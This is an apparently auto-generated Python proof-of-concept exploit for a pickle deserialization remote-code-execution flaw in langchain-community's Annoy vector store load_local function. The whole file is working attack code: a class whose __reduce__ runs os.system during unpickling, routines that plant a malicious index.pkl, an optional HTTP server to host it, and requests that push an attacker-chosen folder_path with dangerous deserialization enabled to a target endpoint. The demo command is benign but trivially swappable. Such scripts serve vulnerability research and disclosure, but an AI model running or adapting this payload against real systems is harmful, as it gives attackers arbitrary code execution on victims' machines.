#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_21.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE via pickle deserialization.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load on a file path constructed from user-controlled folder_path.
If the developer sets allow_dangerous_deserialization=True, an attacker who can
control folder_path can supply a malicious pickle file leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it via a simple HTTP server or local file path
3. Triggering the vulnerable load_local function with the attacker-controlled path

Usage:
    python3 poc.py [--target http://victim:port] [--local-path /path/to/malicious]
"""

import argparse
import base64
import os
import pickle
import subprocess
import sys
import tempfile
import time
import requests
from pathlib import Path

# =============================================================================
# Configuration
# =============================================================================
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_ENDPOINT = "/api/v1/trigger"
BENIGN_COMMAND = "touch /tmp/poc_success.txt"

# =============================================================================
# Malicious pickle payload generation
# =============================================================================
class MaliciousPickle:
    """A class that executes a command when unpickled."""
    def __reduce__(self):
        # Return a tuple (callable, args) that will be called during unpickling
        return (os.system, (BENIGN_COMMAND,))

def create_malicious_pickle(output_path: str) -> None:
    """
    Create a malicious pickle file that executes BENIGN_COMMAND when loaded.
    
    Args:
        output_path: Path where the pickle file will be written
    """
    payload = MaliciousPickle()
    with open(output_path, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Created malicious pickle file at: {output_path}")
    print(f"[+] Payload will execute: {BENIGN_COMMAND}")

def create_malicious_index_pkl(output_dir: str) -> str:
    """
    Create a malicious index.pkl file in the specified directory.
    Also creates a minimal index.annoy file to satisfy the loading code.
    
    Args:
        output_dir: Directory where files will be created
        
    Returns:
        Path to the directory containing malicious files
    """
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    
    # Create malicious index.pkl
    pkl_path = output_path / "index.pkl"
    create_malicious_pickle(str(pkl_path))
    
    # Create a minimal index.annoy file (required by load_local)
    # This is just a placeholder - the actual exploit is in the pickle
    annoy_path = output_path / "index.annoy"
    with open(annoy_path, "wb") as f:
        f.write(b"dummy annoy index")
    
    return str(output_path)

# =============================================================================
# Exploit delivery methods
# =============================================================================
def exploit_via_local_path(local_path: str, target_url: str, endpoint: str) -> None:
    """
    Attempt to exploit by providing a local file path.
    
    Args:
        local_path: Path to directory containing malicious index.pkl
        target_url: Base URL of the vulnerable service
        endpoint: API endpoint to trigger
    """
    full_url = f"{target_url.rstrip('/')}{endpoint}"
    
    # The vulnerable function expects folder_path as input
    # We send it as a JSON payload
    payload = {
        "folder_path": local_path,
        "allow_dangerous_deserialization": True
    }
    
    print(f"[*] Sending exploit to {full_url}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.post(
            full_url,
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if our command executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS! Command executed on target!")
            print("[+] File /tmp/poc_success.txt was created")
        else:
            print("[*] Could not verify command execution on remote target")
            print("[*] Check the target system for /tmp/poc_success.txt")
            
    except requests.exceptions.ConnectionError:
        print("[-] Connection error: Could not reach the target")
        print("[-] Make sure the target service is running")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")

def exploit_via_remote_url(remote_url: str, target_url: str, endpoint: str) -> None:
    """
    Attempt to exploit by providing a remote URL (if the service supports it).
    
    Args:
        remote_url: URL hosting the malicious pickle file
        target_url: Base URL of the vulnerable service
        endpoint: API endpoint to trigger
    """
    full_url = f"{target_url.rstrip('/')}{endpoint}"
    
    # If the service supports remote URLs, we can point to our hosted file
    payload = {
        "folder_path": remote_url,
        "allow_dangerous_deserialization": True
    }
    
    print(f"[*] Sending exploit to {full_url}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.post(
            full_url,
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
    except Exception as e:
        print(f"[-] Error: {e}")

# =============================================================================
# Main exploit function
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langchain-community pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--endpoint",
        default=DEFAULT_ENDPOINT,
        help=f"API endpoint (default: {DEFAULT_ENDPOINT})"
    )
    parser.add_argument(
        "--local-path",
        help="Path to directory containing malicious pickle files (will be created if not exists)"
    )
    parser.add_argument(
        "--remote-url",
        help="URL hosting malicious pickle file (alternative to local path)"
    )
    parser.add_argument(
        "--serve",
        action="store_true",
        help="Start a simple HTTP server to serve malicious files"
    )
    
    args = parser.parse_args()
    
    # Create malicious files
    if args.local_path:
        exploit_dir = args.local_path
        create_malicious_index_pkl(exploit_dir)
    else:
        # Create in a temporary directory
        with tempfile.TemporaryDirectory() as tmpdir:
            exploit_dir = create_malicious_index_pkl(tmpdir)
            
            if args.serve:
                # Start a simple HTTP server to serve the malicious files
                import http.server
                import socketserver
                
                os.chdir(exploit_dir)
                port = 9999
                handler = http.server.SimpleHTTPRequestHandler
                
                print(f"[*] Starting HTTP server on port {port} to serve malicious files")
                print(f"[*] Server directory: {exploit_dir}")
                
                with socketserver.TCPServer(("", port), handler) as httpd:
                    print(f"[*] Server running at http://localhost:{port}")
                    print(f"[*] Malicious file URL: http://localhost:{port}/index.pkl")
                    
                    # In another thread, attempt the exploit
                    if args.remote_url:
                        exploit_via_remote_url(args.remote_url, args.target, args.endpoint)
                    else:
                        # Use local path for exploit
                        exploit_via_local_path(exploit_dir, args.target, args.endpoint)
                    
                    # Keep server running for a bit
                    try:
                        httpd.serve_forever()
                    except KeyboardInterrupt:
                        print("\n[*] Server stopped")
            else:
                # Direct local path exploit
                exploit_via_local_path(exploit_dir, args.target, args.endpoint)
    
    if args.remote_url:
        exploit_via_remote_url(args.remote_url, args.target, args.endpoint)

if __name__ == "__main__":
    print("=" * 60)
    print("langchain-community pickle deserialization RCE PoC")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates the vulnerability by executing:")
    print(f"[*]   {BENIGN_COMMAND}")
    print("[*] on the target system if the exploit is successful.")
    print()
    
    main()
